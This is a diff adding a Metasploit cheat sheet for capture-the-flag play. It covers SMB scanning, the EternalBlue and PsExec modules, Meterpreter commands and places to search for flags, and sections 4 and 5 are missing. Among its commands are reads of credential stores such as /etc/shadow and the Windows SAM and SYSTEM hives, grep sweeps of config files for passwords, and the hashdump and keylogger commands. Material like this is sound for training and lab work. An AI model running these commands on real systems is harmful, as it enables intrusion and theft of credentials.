@@ -1,0 +1,194 @@
+📖 1. Introduction to Metasploit
+Metasploit is a penetration testing framework that allows security professionals to:
+
+🧪 Test system vulnerabilities
+
+🔨 Develop and execute exploit code
+
+🔍 Perform post-exploitation enumeration
+
+🎯 Simulate real-world attacks
+
+🛠️ 2. Basic Metasploit Commands
+🖥️ Console Operations
+bash
+# Start Metasploit Console
+msfconsole
+
+# Search for modules
+search smb
+search type:auxiliary name:scanner
+
+# Use a module
+use auxiliary/scanner/smb/smb_version
+
+# Show options
+show options
+
+# Set options
+set RHOSTS 10.0.0.1
+set THREADS 10
+
+# Run module
+run
+🔍 3. Common SMB Modules
+📊 Scanning & Enumeration
+bash
+# SMB Version Detection
+use auxiliary/scanner/smb/smb_version
+
+# SMB Share Enumeration
+use auxiliary/scanner/smb/smb_enumshares
+
+# SMB User Enumeration
+use auxiliary/scanner/smb/smb_enumusers
+
+# SMB Login Check
+use auxiliary/scanner/smb/smb_login
+💥 Exploitation Modules
+bash
+# EternalBlue (MS17-010)
+use exploit/windows/smb/ms17_010_eternalblue
+
+# PSExec (with credentials)
+use exploit/windows/smb/psexec
+
+
+# In meterpreter session
+meterpreter > shell
+
+# In Windows shell
+C:\> powershell -c "Get-ADObject -Filter '*' -Properties * | Select-Object Description,Info,Comment,Notes | Select-String 'flag{'"
+
+# Or check user comments
+C:\> net user username /domain
+C:\> wmic useraccount get name,sid,description
+
+
+
+🏴‍☠️ 6. CTF Flag Hunting Guide - Where to Find Flags
+🗂️ Active Directory Locations
+powershell
+# 🔍 User descriptions/comments
+Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description -match "flag{"}
+
+# 👥 Group descriptions
+Get-ADGroup -Filter * -Properties Description | Where-Object {$_.Description -match "flag{"}
+
+# 💻 Computer objects
+Get-ADComputer -Filter * -Properties Description | Where-Object {$_.Description -match "flag{"}
+
+# 🎯 Service Principal Names (SPNs)
+setspn -L <username>
+📁 File System Locations
+bash
+# 📄 Common flag file names
+meterpreter > search -f *flag*.txt
+meterpreter > search -f flag.txt
+meterpreter > search -f *.txt | findstr flag
+meterpreter > search -f *secret*
+meterpreter > search -f *password*
+
+# 📁 Common directories (Windows)
+C:\Users\Public\
+C:\Windows\Temp\
+C:\ProgramData\
+C:\inetpub\wwwroot\
+C:\xampp\htdocs\
+%APPDATA%
+%TEMP%
+
+# 📁 Common directories (Linux)
+/root/
+/home/*/Desktop/
+/var/www/html/
+/tmp/
+/opt/
+/etc/
+🔐 Registry Locations (Windows)
+powershell
+# Registry paths that often contain flags
+Get-ItemProperty -Path "HKLM:\Software\CTF" -ErrorAction SilentlyContinue
+Get-ItemProperty -Path "HKCU:\Software\CTF" -ErrorAction SilentlyContinue
+Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-String "flag{"
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\*" | Select-Object DisplayName,Description | Select-String "flag{"
+🌐 Web Application Locations
+bash
+# Source code inspection
+meterpreter > cat /var/www/html/index.php
+meterpreter > cat /var/www/html/config.php
+
+# Database dumps
+meterpreter > cat /var/www/html/backup.sql
+meterpreter > cat /var/www/html/dump.sql
+
+# Environment files
+meterpreter > cat .env
+meterpreter > cat config.ini
+📝 Document & Configuration Files
+bash
+# 🔍 Text files
+find / -name "*.txt" -type f 2>/dev/null | xargs grep -l "flag{" 2>/dev/null
+
+# 📋 Configuration files
+find / -name "*.conf" -type f 2>/dev/null | xargs grep -l "flag{" 2>/dev/null
+find / -name "*.config" -type f 2>/dev/null | xargs grep -l "flag{" 2>/dev/null
+
+# 📄 Readme and documentation
+find / -name "README*" -type f 2>/dev/null | xargs grep -l "flag{" 2>/dev/null
+find / -name "*.md" -type f 2>/dev/null | xargs grep -l "flag{" 2>/dev/null
+🗄️ Database Locations
+sql
+-- MySQL/MariaDB
+SELECT * FROM information_schema.tables WHERE table_comment LIKE '%flag%';
+SELECT * FROM information_schema.columns WHERE column_comment LIKE '%flag%';
+
+-- PostgreSQL
+SELECT * FROM pg_tables WHERE tablename LIKE '%flag%';
+SELECT * FROM information_schema.columns WHERE column_name LIKE '%flag%';
+🎨 Steganography & Hidden Data
+bash
+# 🔍 Strings in binary files
+strings file.exe | grep -i flag
+
+# 📸 Images (EXIF data)
+exiftool image.jpg | grep -i flag
+
+# 📁 Hidden directories
+ls -la | grep "^\."
+find / -type d -name ".*" 2>/dev/null
+
+# 📝 Hidden files
+find / -type f -name ".*" 2>/dev/null | xargs grep -l "flag{" 2>/dev/null
+🔑 Password & Credential Files
+bash
+# 🔐 Common credential file locations
+meterpreter > cat /etc/passwd
+meterpreter > cat /etc/shadow
+meterpreter > cat C:\Windows\System32\config\SAM
+meterpreter > cat C:\Windows\System32\config\SYSTEM
+
+# 📄 Configuration files with passwords
+find / -name "*.xml" -type f 2>/dev/null | xargs grep -l "password" 2>/dev/null
+find / -name "*.yml" -type f 2>/dev/null | xargs grep -l "password" 2>/dev/null
+find / -name "*.json" -type f 2>/dev/null | xargs grep -l "password" 2>/dev/null
+📋 7. Meterpreter Cheat Sheet
+🎯 Basic Commands
+bash
+sysinfo           # ℹ️ System information
+getuid           # 👤 Current user
+ps               # 📊 List processes
+migrate <PID>    # 🔄 Migrate to another process
+📁 File Operations
+bash
+pwd              # 📍 Print working directory
+ls               # 📂 List files
+cd               # 📁 Change directory
+download file    # ⬇️ Download file
+upload file      # ⬆️ Upload file
+🔍 Information Gathering
+bash
+hashdump         # 🔑 Dump password hashes
+screenshot       # 📸 Take screenshot
+keyscan_start    # ⌨️ Start keylogger
+webcam_list      # 📹 List webcams
